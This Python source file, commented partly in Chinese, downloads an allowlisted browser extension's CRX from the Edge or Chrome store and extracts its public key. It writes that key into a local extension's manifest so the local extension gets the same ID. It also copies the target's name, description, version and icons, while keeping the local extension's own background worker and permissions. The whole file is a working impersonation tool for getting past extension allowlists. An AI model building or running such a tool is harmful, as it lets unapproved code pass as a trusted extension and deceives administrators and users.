import base64
import hashlib
import json
import os
import struct
import zipfile
import io
import urllib.request
import urllib.error


EDGE_CRX_URL = (
    "https://edge.microsoft.com/extensionwebstorebase/v1/crx"
    "?response=redirect&prod=chromiumcrx&prodchannel="
    "&x=id%3D{ext_id}%26installsource%3Dondemand%26uc"
)

CHROME_CRX_URL = (
    "https://clients2.google.com/service/update2/crx"
    "?response=redirect&prodversion=120.0&acceptformat=crx3"
    "&x=id%3D{ext_id}%26uc"
)

BROWSER_TO_STORE: dict[str, str] = {
    "edge":    EDGE_CRX_URL,
    "chrome":  CHROME_CRX_URL,
    "brave":   CHROME_CRX_URL,
    "vivaldi": CHROME_CRX_URL,
}

RSA_OID = b"\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01"


# CRX Download with proxy support
def download_crx(ext_id: str, browser: str = "edge", proxy: str = None) -> tuple[bytes, str] | tuple[None, None]:
    url = BROWSER_TO_STORE[browser].format(ext_id=ext_id)
    print(f"[*] Downloading CRX for {ext_id} …")
    print(f"[*]   URL: {url}")
    
    if proxy:
        print(f"[*]   Using proxy: {proxy}")
    
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})

        # configure proxy if provided
        if proxy:
            proxy_handler = urllib.request.ProxyHandler({
                'http': proxy,
                'https': proxy
            })

            opener = urllib.request.build_opener(proxy_handler)
            with opener.open(req, timeout=15) as resp:
                data = resp.read()
                print(f"[+] CRX downloaded ({len(data)} bytes)")
                return data, url
        else:
            # use default handler if no proxy
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = resp.read()
                print(f"[+] CRX downloaded ({len(data)} bytes)")
                return data, url

    except urllib.error.HTTPError as e:
        print(f"[-] HTTP {e.code}")
    except Exception as e:
        print(f"[-] Error: {e}")
    return None, None


# SPKI parsing
def _parse_spki_at(header: bytes, offset: int) -> bytes | None:
    """Try to parse a SubjectPublicKeyInfo SEQUENCE at header[offset]."""
    if offset < 0 or offset >= len(header) or header[offset] != 0x30:
        return None
    candidate = header[offset:]
    if len(candidate) < 2:
        return None
    b1 = candidate[1]
    if b1 == 0x82:
        if len(candidate) < 4:
            return None
        key_len = struct.unpack_from(">H", candidate, 2)[0] + 4
    elif b1 == 0x81:
        if len(candidate) < 3:
            return None
        key_len = candidate[2] + 3
    else:
        key_len = b1 + 2
    if key_len <= 0 or key_len > len(candidate):
        return None
    return candidate[:key_len]


def _collect_spki_candidates(header_data: bytes) -> list[bytes]:
    """
    Walk the CRX3 header and return every distinct RSA SPKI found.
    A CRX3 can carry multiple proofs (developer key + Google publisher key),
    so we collect them all and let the caller pick the right one.
    """
    candidates = []
    seen = set()
    search_from = 0

    while True:
        rel = header_data.find(RSA_OID, search_from)
        if rel == -1:
            break

        # Walk a small window backwards to find the enclosing SEQUENCE (0x30)
        start = max(0, rel - 6)
        for offset in range(start, rel):
            spki = _parse_spki_at(header_data, offset)
            if spki is None:
                continue
            # The SPKI must actually contain the OID we matched
            if RSA_OID not in spki:
                continue
            key = bytes(spki)
            if key not in seen:
                seen.add(key)
                candidates.append(key)
            break

        search_from = rel + len(RSA_OID)

    return candidates


# Public Key Extraction
def extract_key_from_zip(zip_data: bytes) -> bytes | None:
    try:
        with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
            if "manifest.json" in z.namelist():
                manifest = json.loads(z.read("manifest.json"))
                key_b64 = manifest.get("key")
                if key_b64:
                    print("[*] Key found inside manifest.json of ZIP")
                    return base64.b64decode(key_b64)
    except Exception as e:
        print(f"[-] ZIP read error: {e}")
    return None


def extract_public_key(crx_data: bytes, ext_id: str | None = None) -> bytes | None:
    """
    Extract the RSA public key (DER) from a CRX3 blob.

    When ext_id is provided, iterates over ALL RSA SPKIs found in the header
    and returns the one whose derived ID matches ext_id
    This handles CRX3 files that carry multiple proofs
    (developer key + Google publisher key).
    """
    if crx_data[:4] != b"Cr24":
        print("[-] Not a valid CRX3 file")
        return None

    header_size = struct.unpack_from("<I", crx_data, 8)[0]
    header_data = crx_data[12: 12 + header_size]
    zip_data    = crx_data[12 + header_size:]

    candidates = _collect_spki_candidates(header_data)

    if ext_id:
        # Try each candidate and return the one matching the requested ID
        for key_bytes in candidates:
            if key_to_crx_id(key_bytes) == ext_id:
                return key_bytes

        # Fallback: key may only be in the ZIP manifest
        zip_key = extract_key_from_zip(zip_data)
        if zip_key and key_to_crx_id(zip_key) == ext_id:
            return zip_key

        if candidates:
            print(f"[-] None of the {len(candidates)} candidate key(s) match {ext_id}")
        else:
            print(f"[-] No RSA key found in CRX3 header for {ext_id}")
        return None

    # No ext_id: return first candidate (legacy behaviour)
    if candidates:
        return candidates[0]
    return extract_key_from_zip(zip_data)


# ID derivation
def key_to_crx_id(key_bytes: bytes) -> str:
    digest = hashlib.sha256(key_bytes).hexdigest()[:32]
    return ''.join(chr(ord('a') + int(c, 16)) for c in digest)


# Public API
def get_public_key_for_id(ext_id: str, browser: str = "edge", proxy: str = None) -> str | None:
    crx_data, _ = download_crx(ext_id, browser, proxy=proxy)
    if not crx_data:
        return None

    key_bytes = extract_public_key(crx_data, ext_id=ext_id)
    if not key_bytes:
        print(f"[-] Could not extract public key for {ext_id}")
        return None

    key_b64     = base64.b64encode(key_bytes).decode()
    computed_id = key_to_crx_id(key_bytes)

    if computed_id != ext_id:
        print(f"[!] Warning: computed ID ({computed_id}) != requested ID ({ext_id})")
    else:
        print(f"[+] Key extracted and verified (ID: {computed_id})")

    return key_b64


def patch_manifest(extension_dir: str, public_key: str) -> bool:
    manifest_path = os.path.join(extension_dir, "manifest.json")
    if not os.path.exists(manifest_path):
        print(f"[-] manifest.json not found in {extension_dir}")
        return False

    with open(manifest_path, "r", encoding="utf-8") as f:
        manifest = json.load(f)

    had_key = "key" in manifest
    manifest["key"] = public_key

    with open(manifest_path, "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2, ensure_ascii=False)

    print("[+] Key " + ("replaced" if had_key else "added") + " in manifest.json")
    return True

# ---------- 以下为“整套伪装”(名字/描述/图标)的增强 ----------

def extract_zip_members(crx_data: bytes) -> dict | None:
    """从 CRX3 的 zip 部分读出所有成员: {相对路径: 内容bytes}。"""
    if not crx_data or crx_data[:4] != b"Cr24":
        return None
    try:
        header_size = struct.unpack_from("<I", crx_data, 8)[0]
    except Exception:
        return None
    zip_data = crx_data[12 + header_size:]
    out = {}
    try:
        with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
            for n in z.namelist():
                if not n.endswith("/"):
                    out[n] = z.read(n)
    except Exception:
        return None
    return out


def _resolve_msg_key(value, members, default_locale):
    """把 __MSG_xxx__ 解析成 default_locale 下的真实文本。"""
    if not (isinstance(value, str) and value.startswith("__MSG_") and value.endswith("__")):
        return value
    key = value[6:-2]
    mp = f"_locales/{default_locale}/messages.json"
    raw = members.get(mp)
    if not raw:
        return value
    try:
        msgs = json.loads(raw)
        m = msgs.get(key) or {}
        return m.get("message", value)
    except Exception:
        return value


def apply_spoof_metadata(extension_dir: str, crx_data: bytes) -> bool:
    """
    把白名单扩展的 名字/描述/图标(以及版本) 套到本地扩展的 manifest 上，
    使"名字+ID+描述+图标"都和那个白名单扩展一致。
    保留本地扩展原有的 background service_worker 和权限（GAP 所需），
    key 由调用方另外设置（进而决定 ID）。
    """
    members = extract_zip_members(crx_data)
    if not members or "manifest.json" not in members:
        print("[-] apply_spoof_metadata: 未能在 CRX 中找到 manifest.json")
        return False

    try:
        tgt = json.loads(members["manifest.json"])
    except Exception as e:
        print("[-] 解析白名单扩展 manifest 失败:", e)
        return False

    mp = os.path.join(extension_dir, "manifest.json")
    with open(mp, "r", encoding="utf-8") as f:
        our = json.load(f)

    default_locale = tgt.get("default_locale")

    # 1) 先删掉自己原本的图标，避免残留
    def _drop_icon(drop_manifest, key):
        for p in ((drop_manifest.get(key) or {}).values()):
            fp = os.path.join(extension_dir, p)
            if os.path.isfile(fp):
                try:
                    os.remove(fp)
                except OSError:
                    pass
    _drop_icon(our, "icons")
    for act in ("action", "browser_action"):
        for p in ((our.get(act) or {}).get("default_icon") or {}).values():
            fp = os.path.join(extension_dir, p)
            if os.path.isfile(fp):
                try:
                    os.remove(fp)
                except OSError:
                    pass

    # 2) 覆盖 名字 / 描述 / 版本 / default_locale（解析 i18n）
    our["name"] = _resolve_msg_key(tgt.get("name", our.get("name")), members, default_locale)
    if "description" in tgt:
        our["description"] = _resolve_msg_key(tgt["description"], members, default_locale)
    if "version" in tgt:
        our["version"] = tgt["version"]
    if default_locale:
        our["default_locale"] = default_locale

    # 3) 写入白名单扩展的 图标 / _locales 文件
    for path, data in members.items():
        low = path.lower()
        if low.endswith((".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico")) or path.startswith("_locales/"):
            dest = os.path.join(extension_dir, path)
            os.makedirs(os.path.dirname(dest), exist_ok=True)
            with open(dest, "wb") as f:
                f.write(data)

    # 4) 套用图标映射
    if "icons" in tgt:
        our["icons"] = {k: v for k, v in tgt["icons"].items()}
    for act in ("action", "browser_action"):
        if act in tgt and isinstance(tgt[act], dict) and "default_icon" in tgt[act]:
            our.setdefault(act, {})["default_icon"] = {k: v for k, v in tgt[act]["default_icon"].items()}

    with open(mp, "w", encoding="utf-8") as f:
        json.dump(our, f, indent=2, ensure_ascii=False)

    print(f"[+] 已套用白名单扩展身份 (name={our.get('name')!r})")
    return True


def fetch_spoof_package(ext_id: str, browser: str = "edge", proxy: str = None) -> tuple:
    """下载 CRX 并同时取出 (公钥b64, crx_data)。下载失败返回 (None, None)。"""
    crx_data, _ = download_crx(ext_id, browser, proxy=proxy)
    if not crx_data:
        return None, None
    key_bytes = extract_public_key(crx_data, ext_id=ext_id)
    if not key_bytes:
        print(f"[-] 未能从 {ext_id} 的 CRX 提取公钥")
        return None, None
    key_b64 = base64.b64encode(key_bytes).decode()
    return key_b64, crx_data
